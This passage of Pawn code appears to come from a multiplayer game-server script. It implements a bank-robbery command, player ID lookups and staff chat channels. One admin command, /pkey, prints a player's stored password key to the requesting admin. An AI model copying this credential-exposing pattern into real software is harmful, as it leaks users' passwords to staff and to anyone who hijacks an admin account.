        if(GetPlayerWantedLevel(playerid) >= 1) return SCM(playerid,COLOR_ALI,"You can't do a rob when you've got wanted level(s).");
        if(PINFO[playerid][pRob] <= 9) return SCM(playerid,COLOR_ALI,"You haven't enough rob points.");
        new passengers,passenger[20],car = GetPlayerVehicleID(playerid);
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(GetPlayerVehicleID(i) == car && GetPlayerState(i) == PLAYER_STATE_PASSENGER)
                {
                    passenger[passengers] = i;
                    passengers ++;
                }
            }
        }
        new lolstr[256];format(lolstr,256,"You haven't enough passengers, you need %i more passengers to be on your vehicle.",3-passengers);
        if(passengers <= 2) return SCM(playerid,COLOR_ALI,lolstr);
        for(new i;i<passengers;i++)
        {
            if(PINFO[passenger[i]][pLevel] <= 4)
            {
                return SCM(playerid,COLOR_ALI,"Some passenger of your vehicle hasen't enough level.");
            }
            if(GetPlayerWantedLevel(passenger[i]) >= 1)
            {
                return SCM(playerid,COLOR_ALI,"Some passenger of your vehicle has some wanted levels.");
            }
            if(PINFO[passenger[i]][pRob] <= 9)
            {
                return SCM(playerid,COLOR_ALI,"Some passenger of your vehicle hasen't enough rob point.");
            }
        }
        if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
        if(PlayerToPoint(20.0,playerid,1462.045043,-1022.331298,23.828125))
        {
            new rand = RandomShomare(1,5);
            if(rand == 1)
            { CP[playerid]= 2002001; SetPlayerCheckpoint(playerid, 2367.964111,-2015.561279,13.543686,5.0); }
            else if(rand == 2)
            { CP[playerid]= 2002002; SetPlayerCheckpoint(playerid, 2769.609375,-1606.480957,10.921875,5.0); }
            else if(rand == 3)
            { CP[playerid]= 2002003; SetPlayerCheckpoint(playerid, 2334.011474,-2078.141601,13.553783,5.0); }
            else if(rand == 4)
            { CP[playerid]= 2002004; SetPlayerCheckpoint(playerid, 1386.927855,-1458.305053,13.543418,5.0); }
            else if(rand == 5)
            { CP[playerid]= 2002005; SetPlayerCheckpoint(playerid, 1086.228881,-1359.360473,13.676521,5.0); }
            OnCheckpoint[playerid] = 1;
            for(new i;i<passengers;i++)
            {
                OnRob[passenger[i]] = true;
                RobDriver[passenger[i]] = playerid;
                SetPlayerWantedLevel(passenger[i],GetPlayerWantedLevel(passenger[i])+6);
                SetPlayerCriminal(passenger[i],INVALID_PLAYER_ID, "Bank robbery",6);
                SCM(passenger[i],COLOR_LIGHTRED, "you Robbed the bank and become 6 Wanted");
                SCM(passenger[i],COLOR_LIGHTRED, "Do not exit of car before you arrive to checkpoint!");
                PlayerInfo[passenger[i]][pRob] = 0;
                SaveKonVal(passenger[i], "pRob", 0);
                RobMember[playerid][i] = passenger[i];
            }
            RobMemberCount[playerid] = passengers;
            OnRob[playerid] = true;
            RobLeader[playerid] = true;
            SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+6);
            SetPlayerCriminal(playerid,INVALID_PLAYER_ID, "Bank robbery", 6);
            SCM(playerid,COLOR_LIGHTRED, "you Robbed the bank and become 6 Wanted");
            SCM(playerid,COLOR_LIGHTRED, "Do not exit of car before you arrive to checkpoint!");
            PlayerInfo[playerid][pRob] = 0;
            SaveKonVal(playerid, "pRob", 0);
            RobDriver[playerid] = INVALID_PLAYER_ID;
            return 1;
        }
        else if(PlayerToPoint(7.0,playerid,2577.072998,1322.112426,10.820312))
        {
            new rand = RandomShomare(1,4);
            if(rand == 1)
            { CP[playerid]= 2002006; SetPlayerCheckpoint(playerid, 2783.250732,2199.683349,10.820312,5.0); }
            else if(rand == 2)
            { CP[playerid]= 2002007; SetPlayerCheckpoint(playerid, 2102.033935,2652.402343,10.820312,5.0); }
            else if(rand == 3)
            { CP[playerid]= 2002008; SetPlayerCheckpoint(playerid, 1583.934814,1920.543579,10.820312,5.0); }
            else if(rand == 4)
            { CP[playerid]= 2002009; SetPlayerCheckpoint(playerid, 1716.415771,1160.865600,10.756690,5.0); }
            OnCheckpoint[playerid] = 1;
            for(new i;i<passengers;i++)
            {
                OnRob[passenger[i]] = true;
                RobDriver[passenger[i]] = playerid;
                SetPlayerWantedLevel(passenger[i],GetPlayerWantedLevel(passenger[i])+6);
                SetPlayerCriminal(passenger[i],INVALID_PLAYER_ID, "Bank robbery", 6);
                SCM(passenger[i],COLOR_LIGHTRED, "you Robbed the bank and become 6 Wanted");
                SCM(passenger[i],COLOR_LIGHTRED, "Do not exit of car before you arrive to checkpoint!");
                PlayerInfo[passenger[i]][pRob] = 0;
                SaveKonVal(passenger[i], "pRob", 0);
                RobMember[playerid][i] = passenger[i];
            }
            RobMemberCount[playerid] = passengers;
            OnRob[playerid] = true;
            RobLeader[playerid] = true;
            SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+6);
            SetPlayerCriminal(playerid,INVALID_PLAYER_ID, "Bank robbery", 6);
            SCM(playerid,COLOR_LIGHTRED, "you Robbed the bank and become 6 Wanted");
            SCM(playerid,COLOR_LIGHTRED, "Do not exit of car before you arrive to checkpoint!");
            PlayerInfo[playerid][pRob] = 0;
            SaveKonVal(playerid, "pRob", 0);
            RobDriver[playerid] = INVALID_PLAYER_ID;
            return 1;
        }
        else return SCM(playerid,COLOR_ALI,"You are not near any bank.");
    }
if(strcmp(cmd, "/id", true) == 0)
    {
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /id <PlayerID/PartOfName>");
        new target = ReturnUser(tmp);
        new targetid = ReturnUser(tmp);
        if(!IsPlayerConnected(target)) return SCM(playerid, COLOR_YELLOW2, "Error: Player isn't connected.");
        new sstring[256];
        new ttext[50];
        if(PlayerInfo[target][pMember] == 2 || PlayerInfo[target][pLeader] == 2) { ttext = "F.B.I"; }
        else if(PlayerInfo[target][pMember] == 1 || PlayerInfo[target][pLeader] == 1) { ttext = "Police Departament"; }
        else if(PlayerInfo[target][pMember] == 3 || PlayerInfo[target][pLeader] == 3) { ttext = "National Guard"; }
        else if(PlayerInfo[target][pMember] == 5 || PlayerInfo[target][pLeader] == 5) { ttext = "Silence Mafia Family"; }
        else if(PlayerInfo[target][pMember] == 6 || PlayerInfo[target][pLeader] == 6) { ttext = "The Killers Family"; }
        else if(PlayerInfo[target][pMember] == 12 || PlayerInfo[target][pLeader] == 12) { ttext = "Dangerous Tigers Family"; }
        else if(PlayerInfo[target][pMember] == 13 || PlayerInfo[target][pLeader] == 13) { ttext = "Legendary Men Family"; }
        else if(PlayerInfo[target][pMember] == 14 || PlayerInfo[target][pLeader] == 14) { ttext = "Fast N Farious Family"; }
        else if(PlayerInfo[target][pMember] == 15 || PlayerInfo[target][pLeader] == 15) { ttext = "Storm Men Family"; }
        else if(PlayerInfo[target][pMember] == 7 || PlayerInfo[target][pLeader] == 7) { ttext = "Mayor"; }
        else if(PlayerInfo[target][pMember] == 8 || PlayerInfo[target][pLeader] == 8) { ttext = "Hitman Agency"; }
        else if(PlayerInfo[target][pMember] == 4 || PlayerInfo[target][pLeader] == 4) { ttext = "Firemen/Paramedic"; }
        else if(PlayerInfo[target][pMember] == 9 || PlayerInfo[target][pLeader] == 9) { ttext = "News Reporter"; }
        else if(PlayerInfo[target][pMember] == 10 || PlayerInfo[target][pLeader] == 10) { ttext = "Taxi Drivers"; }
        else if(PlayerInfo[target][pMember] == 16 || PlayerInfo[target][pLeader] == 16) { ttext = "Tow Car Company"; }
        else if(PlayerInfo[target][pMember] == 19 || PlayerInfo[target][pLeader] == 19) { ttext = "The Racers"; }
        else if(PlayerInfo[target][pMember] == 20 || PlayerInfo[target][pLeader] == 20) { ttext = "SFPD"; }
        else if(PlayerInfo[target][pMember] == 11 || PlayerInfo[target][pLeader] == 11) { ttext = "School Instructor"; }
        else { ttext = "None"; }
        // End faction
        // Start Rank
        new rtext[64];
        if(PlayerInfo[target][pMember] == 1 || PlayerInfo[target][pLeader] == 1)//PD Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[target][pMember] == 2 || PlayerInfo[target][pLeader] == 2)//FBI Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 3 || PlayerInfo[targetid][pLeader] == 3)//NG Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 4 || PlayerInfo[targetid][pLeader] == 4)//Medic Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 5 || PlayerInfo[targetid][pLeader] == 5)//Silence Mafia Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 6 || PlayerInfo[targetid][pLeader] == 6)//The Killers Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 7)//Mayor ranks
        {
            if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 8 || PlayerInfo[targetid][pLeader] == 8)//Hitman Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 9 || PlayerInfo[targetid][pLeader] == 9)//NR Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }
        }
        else if(PlayerInfo[targetid][pMember] == 10 || PlayerInfo[targetid][pLeader] == 10)//Taxi Company Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }
        }
        else if(IsAnInstructor(targetid))//Driving/Flying School Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }
        }
        else if(PlayerInfo[targetid][pMember] == 12 || PlayerInfo[targetid][pLeader] == 12)//Dangerous Tigers Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 13 || PlayerInfo[targetid][pLeader] == 13)//LegendaryMen Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 14 || PlayerInfo[targetid][pLeader] == 14)//FastNFarious Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 15 || PlayerInfo[targetid][pLeader] == 15)//StormMen Family Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 16 || PlayerInfo[targetid][pLeader] == 16)//TCC Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 20 || PlayerInfo[targetid][pLeader] == 20)//SFPD Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }

		}
        else if(PlayerInfo[targetid][pMember] == 19 || PlayerInfo[targetid][pLeader] == 19)//The Racers Ranks
        {
            if(PlayerInfo[target][pRank] == 1) { rtext = "1"; }
            else if(PlayerInfo[target][pRank] == 2) { rtext = "2"; }
            else if(PlayerInfo[target][pRank] == 3) { rtext = "3"; }
            else if(PlayerInfo[target][pRank] == 4) { rtext = "4"; }
            else if(PlayerInfo[target][pRank] == 5) { rtext = "5"; }
            else if(PlayerInfo[target][pRank] == 6) { rtext = "Sub-Leader"; }
            else if(PlayerInfo[target][pRank] == 7) { rtext = "Leader"; }
		}
        else
        {
            rtext = "None";
        }
        // End Rank
        // Start Job

        // End job
        new dutytext[64];
        if(OnDuty[target] == 1) { dutytext = "(Duty)"; }
        format(sstring, sizeof(sstring), "ID:(%d) %s | Level: %d | Faction: %s (%s) %s",target,PINFO[target][pName],PINFO[target][pLevel],ttext,rtext,dutytext);
        return SendClientMessage(playerid, COLOR_YELLOW2, sstring);

      }

        // /password key

    if(strcmp(cmd, "/pkey", true) == 0)
    {
        if(PINFO[playerid][pAdmin] < 1300) return SCM(playerid, COLOR_YELLOW2, "Error: You are not admin.");
        if(IsPlayerConnected(playerid))
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /pkey <PlayerID/PartOfName>");
        new target = ReturnUser(tmp);
        if(!IsPlayerConnected(target)) return SCM(playerid, COLOR_YELLOW2, "Error: Player isn't connected.");
        new sstring[256];
        format(sstring, sizeof(sstring), "Password: (%s)",PINFO[target][pKey]);
        return SendClientMessage(playerid, COLOR_YELLOW, sstring);
    }
	   if(strcmp(cmd, "/reps", true) == 0)
    {
        if(PINFO[playerid][pAdmin] < 1300) return SCM(playerid, COLOR_YELLOW2, "Error: You are not admin.");
        if(IsPlayerConnected(playerid))
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /reps <PlayerID/PartOfName>");
        new target = ReturnUser(tmp);
        if(!IsPlayerConnected(target)) return SCM(playerid, COLOR_YELLOW2, "Error: Player isn't connected.");
        new sstring[256];
        format(sstring, sizeof(sstring), "Player Reps : (%i)",PINFO[target][pRep]);
        return SendClientMessage(playerid, COLOR_YELLOW, sstring);
    }
//----------------------------------[AdminChat]-----------------------------------------------
    if(!strcmp(cmd, "/helperchat", true) || !strcmp(cmd, "/hcc", true))
    {
        if(PINFO[playerid][pHelper] < 1) return SCM(playerid, COLOR_GREEN, "Error: Your helper level isn't high enough to use this command.");
        new speak[256];
        new hrank[64];
        tmp = strtokEx(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /hcc <Text>");
            if(PlayerInfo[playerid][pHelper] == 1) { hrank = "lvl 1"; }
            else if(PlayerInfo[playerid][pHelper] == 2) { hrank = "level 2"; } //sssss {F3A32A}%s
            else if(PlayerInfo[playerid][pHelper] == 3) { hrank = "level 3"; }
            else if(PlayerInfo[playerid][pHelper] == 4) { hrank = "level 4"; }
            else if(PlayerInfo[playerid][pHelper] == 5) { hrank = "level 5"; }
            else if(PlayerInfo[playerid][pHelper] == 6) { hrank = "Leader"; }
			else { hrank = "leader"; }
        format(speak, 256, "{0000FF}<< {19AF23}Helper {F3A32A}%s {33CCFF}%s:{FFFFFF} %s {0000FF}>>",hrank, PINFO[playerid][pName], tmp);
        print(speak);
        for(new i;i < LastPID; i++)
        {
            if(IsPlayerConnected(i) && PINFO[i][pHelper] >= 1)
            {
                SCM(i, COLOR_WHITE, speak);
            }
        }
        return 1;
    }

        if(strcmp(cmd, "/c", true) == 0 || strcmp(cmd, "/clan", true) == 0 || strcmp(cmd, "/cchat", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/c)lan [clan chat]");
                return 1;
            }
            if (PlayerInfo[playerid][pClan] > 0)
            {
                new c = PlayerInfo[playerid][pClan];

                if(c > 0)
                {
                    if(PlayerInfo[playerid][pcRank] == 7) { format(string, sizeof(string), "** (( Leader %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pcRank] == 6) { format(string, sizeof(string), "** (( R6 %s: %s )) **", sendername, result); }
                    else if(PlayerInfo[playerid][pcRank] == 5) { format(string, sizeof(string), "** (( R5 %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pcRank] == 4) { format(string, sizeof(string), "** (( R4 %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pcRank] == 3) { format(string, sizeof(string), "** (( R3 %s: %s ))  **", sendername, result); }
                    else if(PlayerInfo[playerid][pcRank] == 2) { format(string, sizeof(string), "** (( R2 %s: %s ))  **", sendername, result); }
                    else { format(string, sizeof(string), "** (( R1 %s: %s )) **", sendername, result); }
                    SendClanMessage(PlayerInfo[playerid][pClan], 0x33AA33AA, string);
                }
                //printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   you are not part of a Family!");
                return 1;
            }
        }//not connected
        return 1;
    }
if(strcmp(cmd, "/adminchat", true) == 0 || strcmp(cmd, "/a", true) == 0)
	{
if(PINFO[playerid][pAdmin] < 1) return 1;
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
   			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result)) return SCM(playerid,COL_SYN,"Syntax: /a <Text>");
			new arank[64];
			if(PlayerInfo[playerid][pAdmin] == 1) { arank = "Trial-Admin"; }
			else if(PlayerInfo[playerid][pAdmin] == 2) { arank = "Newcomer-Admin"; }
			else if(PlayerInfo[playerid][pAdmin] == 3) { arank = "Loyal-Admin"; }
			else if(PlayerInfo[playerid][pAdmin] == 4) { arank = "Head-Admin"; }
			else if(PlayerInfo[playerid][pAdmin] == 5) { arank = "Chief-Admin"; }
            else if(PlayerInfo[playerid][pAdmin] == 6) { arank = "SuperVisior"; }
            else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Hoster"; }
            else if(PlayerInfo[playerid][pAdmin] == 8) { arank = "Pro-Hoster"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "Manager"; }
            else if(PlayerInfo[playerid][pAdmin] == 2000) { arank = "Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 10) { arank = "Co-Founder"; }
            else if(PlayerInfo[playerid][pAdmin] == 11) { arank = "Founder"; }
			else { arank = "Owner"; }
			format(string, sizeof(string), "{a188e2}[ADMINCHAT] {FFFFFF}%s {ff9a5b}%s : {FFFFFF}%s ", arank, sendername, result);
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				SendAdminMessage(COLOR_GG, string);
				printf("Admin %s: %s", sendername, result);
			}
		}
		return 1;
	}

		if(strcmp(cmd, "/Ownerchat", true) == 0 || strcmp(cmd, "/oc", true) == 0)
	{
	    if(PINFO[playerid][pAdmin] < 6) return SCM(playerid, COLOR_YELLOW2, "Error: You are not Owner.");
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
   			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result)) return SCM(playerid,COL_SYN,"Syntax: /Ownerchat <Text>");
			new arank[64];
            if(PlayerInfo[playerid][pAdmin] == 6) { arank = "Administration Team"; }
            else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Supervisor"; } //sssss
            else if(PlayerInfo[playerid][pAdmin] == 8) { arank = "CM Hoster"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "CM Manager"; }
            else if(PlayerInfo[playerid][pAdmin] == 2000) { arank = "CM Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 1346) { arank = "CM Founder"; }
			else { arank = "Owner"; }
			format(string, sizeof(string), "{E04343}<< {BBF060}%s {57e547}%s: {6F9BF2}%s {E04343}>>", arank, sendername, result);
			if (PlayerInfo[playerid][pAdmin] >= 6)
			{
				SendAdminMessageg(COLOR_GG, string);
				printf("Admin %s: %s", sendername, result);
			}
		}
		return 1;
	}
//lc chat by eblis
if(strcmp(cmd, "/leaderchat", true) == 0 || strcmp(cmd, "/lc", true) == 0)
    {
		if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,-1,"You cannot speak when you are muted.");
        if(PINFO[playerid][pLeader] < 1) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result)) return SCM(playerid,COL_SYN,"Syntax: /lc <Text>");
            new arank[64];
            if(PlayerInfo[playerid][pLeader] == 1) { arank = "{F3A32A}<< {2400ff}PD Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 2) { arank = "{F3A32A}<< F.B.I Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 3) { arank = "{F3A32A}<< {100072}NG Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 4) { arank = "{F3A32A}<< {57e547}Medic Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 5) { arank = "{F3A32A}<< {5D7E8D}Silence Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 6) { arank = "{F3A32A}<< {333334}TK Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 7) { arank = "{F3A32A}<< {9fff6a}Mayor {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 8) { arank = "{F3A32A}<< Hitman Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 9) { arank = "{F3A32A}<< {ad0a9c}NR Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 10) { arank = "{F3A32A}<< {fffc00}Taxi Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 11) { arank = "{F3A32A}<< {00a2ff}S.I Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 12) { arank = "{F3A32A}<< {05b11d}DT Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 13) { arank = "{F3A32A}<< {ffcc00}LM  Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 14) { arank = "{F3A32A}<< {B32CF6}FnF Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 15) { arank = "{F3A32A}<< {00ECEC}Storm Men  Leader {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 16) { arank = "{F3A32A}<< {d1cfcd}TTC Leader >{F3A32A}>"; }
            else if(PlayerInfo[playerid][pLeader] == 17) { arank = "{F3A32A}<< {57e547}Staff / Founder {F3A32A}>>"; }
            else if(PlayerInfo[playerid][pLeader] == 19) { arank = "{F3A32A}<< {0E47FF}The Racers Leader {F3A32A}>>"; }
